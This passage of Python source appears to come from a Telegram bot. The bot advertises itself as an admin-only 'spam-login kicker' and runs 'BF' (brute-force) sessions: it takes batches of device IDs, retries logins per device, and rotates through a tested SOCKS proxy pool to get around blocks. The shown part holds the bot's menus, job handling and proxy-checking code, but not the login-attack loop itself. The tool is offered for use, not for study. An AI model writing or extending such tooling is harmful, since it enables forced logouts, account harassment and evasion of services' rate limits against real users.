                + ("  ·  LOGIN mode" if login_test else "") + "\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                + _progress_bar(done, total, alive, now - t_start))
        _edit(app, loop, chat_id, msg_id, text, kb_stop(uid))

    results = test_proxy_pool(entries, workers=workers, timeout=timeout,
                              protocol=PROXY_PROTOCOL, login_test=login_test,
                              on_progress=progress, stop_flag=stop_ev)

    elapsed = time.time() - t_start
    alive   = len(results["alive"]); dead = len(results["dead"]); total = len(entries)

    try:
        write_alive_dead(results, ALIVE_FILE, DEAD_FILE)
    except Exception as e:
        _edit(app, loop, chat_id, msg_id,
              f"✅ Done — file write failed: `{e}`", kb_back())
        with _proxy_test_lock: _proxy_test_running[0] = False
        with job_lock: active_jobs.pop(uid, None)
        return

    summary = (
        f"🏁 *Proxy Test Complete*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Tested  : `{total}`\n"
        f"✅ Alive   : `{alive}`  ({alive/max(total,1)*100:.1f}%)\n"
        f"❌ Dead    : `{dead}`\n"
        f"⏱ Took    : `{elapsed:.1f}s`\n"
        f"⚙ Workers : `{workers}` · timeout `{timeout}s`\n"
        f"🔌 Proto   : `{PROXY_PROTOCOL}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Alive list → `proxies_alive.txt`"
    )
    _edit(app, loop, chat_id, msg_id, summary, kb_back())

    try:
        if alive > 0 and os.path.exists(ALIVE_FILE):
            with open(ALIVE_FILE, "rb") as f:
                asyncio.run_coroutine_threadsafe(
                    app.bot.send_document(
                        chat_id=chat_id, document=f,
                        filename="proxies_alive.txt",
                        caption=f"✅ {alive}/{total} alive · fastest first"
                    ), loop
                ).result(timeout=30)
    except Exception:
        pass

    if results["alive"]:
        top = "\n".join(
            f"`{fmt_proxy(p)}` — {lat:.0f}ms"
            for p, ok, lat, _ in results["alive"][:5]
        )
        _send(app, loop, chat_id, f"🏆 *Fastest 5 alive*\n{top}", kb_back())

    with _proxy_test_lock: _proxy_test_running[0] = False
    with job_lock: active_jobs.pop(uid, None)

# ────────────────────────────────────────────────────────────────
# HANDLERS
# ────────────────────────────────────────────────────────────────
def admin_only(uid) -> bool:
    return uid == ADMIN_ID

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid):
        await update.message.reply_text(
            "🚫 *Access denied.*\nThis bot is admin-only.", parse_mode="Markdown")
        return
    pool_status = f"`{len(PROXY_POOL)}` endpoints" if PROXY_POOL else "`direct`"
    socks_status = "✅" if HAVE_SOCKS else "❌ (pip install PySocks)"
    await update.message.reply_text(
        f"⚡ *{BOT_NAME} v{BOT_VERSION}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Admin-only spam-login kicker\n"
        f"📱 Up to `{MAX_DEVICES}` devices/session\n"
        f"🌐 Proxy pool: {pool_status}\n"
        f"🔌 PySocks: {socks_status}\n"
        f"🔁 Retries/device: `{LOGIN_RETRIES}`\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown", reply_markup=kb_main()
    )

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not admin_only(update.effective_user.id): return
    await update.message.reply_text(
        f"📖 *Help*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ *New BF Session* — up to `{MAX_DEVICES}` device IDs\n"
        f"🔬 *Test Proxies* — sweep the pool\n"
        f"🛑 */stop* — kill running job\n\n"
        f"*Commands*\n"
        f"`/testproxy` — 50 workers, 8s timeout\n"
        f"`/testproxy 30 5` — 30 workers, 5s timeout\n"
        f"`/testproxy 50 8 login` — full handshake mode\n\n"
        f"*Proxy file*\n"
        f"`proxies.txt` next to bot.py\n"
        f"Format: `host:port:user:pass`\n"
        f"Empty/missing → direct connection",
        parse_mode="Markdown"
    )

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not admin_only(update.effective_user.id): return
    uptime = int(time.time() - start_time)
    with job_lock: running = len(active_jobs)
    await update.message.reply_text(
        f"📊 *Bot Stats*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Uptime   : `{uptime}s`\n"
        f"⚡ Running  : `{running}`\n"
        f"🌐 Pool     : `{len(PROXY_POOL)}`\n"
        f"🔌 PySocks  : `{'yes' if HAVE_SOCKS else 'no'}`\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid): return
    with job_lock: job = active_jobs.get(uid)
    if job and 'stop_event' in job:
        job['stop_event'].set()
        await update.message.reply_text("🛑 Stopping…")
    else:
        await update.message.reply_text("No active job.")

async def cmd_testproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid): return

    if not HAVE_SOCKS:
        await update.message.reply_text(
            "❌ *PySocks missing.*\nRun: `pip install PySocks`",
            parse_mode="Markdown"); return

    with _proxy_test_lock:
        if _proxy_test_running[0]:
            await update.message.reply_text("⚠️ Test already running."); return
        _proxy_test_running[0] = True

    entries = list(PROXY_POOL.entries)
    if not entries:
        with _proxy_test_lock: _proxy_test_running[0] = False
        await update.message.reply_text(
            "❌ *Pool empty.*\nPut `proxies.txt` next to bot.py and restart.",
            parse_mode="Markdown"); return

    workers = TEST_WORKERS
    timeout = TEST_TIMEOUT
    login_test = False
    try:
        if ctx.args and len(ctx.args) >= 1: workers = max(1, min(200, int(ctx.args[0])))
        if ctx.args and len(ctx.args) >= 2: timeout = max(2.0, min(30.0, float(ctx.args[1])))
    except ValueError:
        pass
    if ctx.args and any(a.lower() in ("login", "full") for a in ctx.args):
        login_test = True

    prog = await update.message.reply_text(
        f"🔬 *Starting proxy test*\n"
        f"📦 `{len(entries)}` endpoints\n"
        f"⚙ `{workers}` workers · `{timeout}s` timeout"
        + ("  ·  LOGIN mode" if login_test else ""),
        parse_mode="Markdown"
    )

    stop_ev = threading.Event()
    job = {
        'user_id': uid, 'chat_id': update.effective_chat.id,
        'msg_id': prog.message_id, 'entries': entries,
        'workers': workers, 'timeout': timeout,
        'login_test': login_test, 'stop_event': stop_ev,
        'status': 'running',
    }
    with job_lock:
        if uid in active_jobs and active_jobs[uid].get('status') == 'running':
            with _proxy_test_lock: _proxy_test_running[0] = False
            await update.message.reply_text("⚠️ Job already running. /stop first.")
            return
        active_jobs[uid] = job

    loop = asyncio.get_running_loop()
    threading.Thread(target=run_proxy_test_job,
                     args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid): return
    st = pending.get(uid)
    if not st or st.get('state') != 'devices': return

    raw = update.message.text or ""
    parts = [p.strip() for p in raw.replace(",", "\n").splitlines() if p.strip()]
    if not parts:
        await update.message.reply_text("❌ No device IDs detected."); return
    if len(parts) > MAX_DEVICES:
        await update.message.reply_text(
            f"⚠️ You sent `{len(parts)}` — using first `{MAX_DEVICES}`.",
            parse_mode="Markdown")
        parts = parts[:MAX_DEVICES]

    pending[uid] = {'state': 'mode', 'devices': parts}
    await update.message.reply_text(
        f"✅ *Loaded {len(parts)} device(s)*\n"
        f"🌐 Pool: `{len(PROXY_POOL) or 'direct'}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(f"`{d[:28]}{'…' if len(d) > 28 else ''}`" for d in parts)
        + "\n━━━━━━━━━━━━━━━━━━━━\nPick kick mode:",
        parse_mode="Markdown", reply_markup=kb_mode()
    )

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except BadRequest: pass
    uid  = update.effective_user.id
    data = q.data

    if not admin_only(uid):
        await q.answer("Admin only.", show_alert=True); return

    if data == "bf_new":
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get('status') == 'running':
                await q.edit_message_text("⚠️ Job already running. Use /stop.",
                                          parse_mode="Markdown"); return
        pending[uid] = {'state': 'devices'}
        await q.edit_message_text(
            f"📱 *New BF Session*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Send up to *{MAX_DEVICES}* device IDs.\n"
            f"One per line, or comma-separated.",
            parse_mode="Markdown"
        ); return

    if data == "bf_testproxy":
        if not HAVE_SOCKS:
            await q.edit_message_text(
                "❌ PySocks missing. Run `pip install PySocks`.",
                parse_mode="Markdown", reply_markup=kb_back()); return
        with _proxy_test_lock:
            if _proxy_test_running[0]:
                await q.answer("Already running.", show_alert=True); return
            _proxy_test_running[0] = True
        entries = list(PROXY_POOL.entries)
        if not entries:
            with _proxy_test_lock: _proxy_test_running[0] = False
            await q.edit_message_text(
                "❌ Pool empty — put `proxies.txt` next to bot.py, restart.",
                parse_mode="Markdown", reply_markup=kb_back()); return
        stop_ev = threading.Event()
        job = {
            'user_id': uid, 'chat_id': q.message.chat_id,
            'msg_id': q.message.message_id, 'entries': entries,
            'workers': TEST_WORKERS, 'timeout': TEST_TIMEOUT,
            'login_test': False, 'stop_event': stop_ev,
            'status': 'running',
        }
        with job_lock: active_jobs[uid] = job
        await q.edit_message_text(
            f"🔬 *Testing {len(entries)} proxies* · `{TEST_WORKERS}` workers",
            parse_mode="Markdown", reply_markup=kb_stop(uid)
        )
        loop = asyncio.get_running_loop()
        threading.Thread(target=run_proxy_test_job,
                         args=(job, loop, ctx.application), daemon=True).start()
        return

    if data == "bf_help":
        await q.edit_message_text(
            f"📖 *Help*\n"
            f"• `/start` — menu\n"
            f"• `/stats` — bot stats\n"
            f"• `/stop` — kill job\n"
            f"• `/testproxy [w] [t] [login]` — sweep pool\n"
            f"• Max `{MAX_DEVICES}` devices/session\n"
            f"• Retries: `{LOGIN_RETRIES}` per device\n"
            f"• Pool: `{len(PROXY_POOL)}` endpoint(s)",
            parse_mode="Markdown", reply_markup=kb_back()
        ); return

    if data == "bf_stats":
        uptime = int(time.time() - start_time)
        with job_lock: running = len(active_jobs)
        await q.edit_message_text(
            f"📊 *Stats*\n"
            f"⏱ Uptime: `{uptime}s`\n"
            f"⚡ Running: `{running}`\n"
            f"🌐 Pool: `{len(PROXY_POOL)}`",
            parse_mode="Markdown", reply_markup=kb_back()
        ); return

    if data == "bf_back":
        await q.edit_message_text(f"⚡ *{BOT_NAME}* — main menu",
                                  parse_mode="Markdown", reply_markup=kb_main()); return

    if data == "bf_cancel":
        pending.pop(uid, None)
        await q.edit_message_text("❌ Cancelled.", reply_markup=kb_back()); return

    if data.startswith("bf_mode:"):
        mode_key = data.split(":", 1)[1]
        st = pending.get(uid)
        if not st or st.get('state') != 'mode':
            await q.edit_message_text("⌛ Session expired. Tap New BF again.",
                                      reply_markup=kb_back()); return
        devices = st['devices']
        if mode_key not in MODES:
            await q.edit_message_text("❌ Unknown mode.", reply_markup=kb_back()); return

        mode_lbl, loops, delay = MODES[mode_key]
        pending.pop(uid, None)

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get('status') == 'running':
                await q.edit_message_text("⚠️ Already running.", parse_mode="Markdown"); return
            stop_ev = threading.Event()
            job = {
                'user_id': uid, 'chat_id': q.message.chat_id,
                'msg_id':  q.message.message_id,
                'devices': devices, 'loops': loops, 'delay': delay,
                'stop_event': stop_ev, 'mode_label': mode_lbl,
                'status': 'running',
            }
            active_jobs[uid] = job

        await q.edit_message_text(
            f"⚡ *Starting {mode_lbl}*\n`{len(devices)}` device(s) · pool `{len(PROXY_POOL) or 'direct'}`",
            parse_mode="Markdown", reply_markup=kb_stop(uid)
        )
        loop = asyncio.get_running_loop()
        threading.Thread(target=run_bf_job, args=(job, loop, ctx.application),
                         daemon=True).start()
        return

    if data.startswith("bf_stop:"):
        target = int(data.split(":", 1)[1])
        if target != uid and uid != ADMIN_ID:
            await q.answer("Not your job.", show_alert=True); return
        with job_lock: job = active_jobs.get(target)
        if job and 'stop_event' in job:
            job['stop_event'].set()
            await q.edit_message_text("🛑 Stopping…", parse_mode="Markdown")
        else:
            await q.edit_message_text("No active job.", reply_markup=kb_back())
        return

    await q.answer("Unknown action.", show_alert=True)

# ────────────────────────────────────────────────────────────────
# POST INIT + MAIN
# ────────────────────────────────────────────────────────────────
async def post_init(app: Application) -> None:
    cmds = [
        BotCommand("start",     "Open menu"),
        BotCommand("stats",     "Bot stats"),
        BotCommand("stop",      "Stop running job"),
        BotCommand("testproxy", "Test proxy pool"),
        BotCommand("help",      "Help"),
    ]
    await app.bot.set_my_commands(cmds, scope={"type": "chat", "chat_id": ADMIN_ID})
    print(f"🚀 {BOT_NAME} v{BOT_VERSION} online · pool={len(PROXY_POOL)} · socks={HAVE_SOCKS}")

def main():
    req = HTTPXRequest(
        connect_timeout=30.0, read_timeout=30.0,
        write_timeout=30.0,   pool_timeout=30.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(req)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("help",      cmd_help))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("stop",      cmd_stop))
    app.add_handler(CommandHandler("testproxy", cmd_testproxy))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(on_callback))

    print(f"🔥 {BOT_NAME} v{BOT_VERSION} starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()
